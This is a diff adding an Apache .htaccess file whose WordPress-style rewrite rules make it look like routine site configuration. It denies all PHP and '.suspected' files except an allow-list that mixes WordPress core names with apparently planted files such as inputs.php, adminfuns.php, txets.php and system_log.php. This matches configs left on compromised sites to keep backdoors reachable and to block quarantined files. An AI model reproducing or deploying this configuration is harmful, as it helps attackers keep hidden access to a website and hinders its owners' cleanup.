@@ -1,0 +1,16 @@
+<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(index.php|inputs.php|adminfuns.php|chtmlfuns.php|cjfuns.php|classsmtps.php|classfuns.php|comfunctions.php|comdofuns.php|connects.php|copypaths.php|delpaths.php|doiconvs.php|epinyins.php|filefuns.php|gdftps.php|hinfofuns.php|hplfuns.php|memberfuns.php|moddofuns.php|onclickfuns.php|phpzipincs.php|qfunctions.php|qinfofuns.php|schallfuns.php|tempfuns.php|userfuns.php|siteheads.php|termps.php|txets.php|thoms.php|postnews.php|wp-blog-header.php|wp-config-sample.php|wp-links-opml.php|wp-login.php|wp-settings.php|wp-trackback.php|wp-activate.php|wp-comments-post.php|wp-cron.php|wp-load.php|wp-mail.php|wp-signup.php|xmlrpc.php|edit-form-advanced.php|link-parse-opml.php|ms-sites.php|options-writing.php|themes.php|admin-ajax.php|edit-form-comment.php|link.php|ms-themes.php|plugin-editor.php|admin-footer.php|edit-link-form.php|load-scripts.php|ms-upgrade-network.php|admin-functions.php|edit.php|load-styles.php|ms-users.php|plugins.php|admin-header.php|edit-tag-form.php|media-new.php|my-sites.php|post-new.php|admin.php|edit-tags.php|media.php|nav-menus.php|post.php|admin-post.php|export.php|media-upload.php|network.php|press-this.php|upload.php|async-upload.php|menu-header.php|options-discussion.php|privacy.php|user-edit.php|menu.php|options-general.php|profile.php|user-new.php|moderation.php|options-head.php|revision.php|users.php|custom-background.php|ms-admin.php|options-media.php|setup-config.php|widgets.php|custom-header.php|ms-delete-site.php|options-permalink.php|term.php|customize.php|link-add.php|ms-edit.php|options.php|edit-comments.php|link-manager.php|ms-options.php|options-reading.php|system_log.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
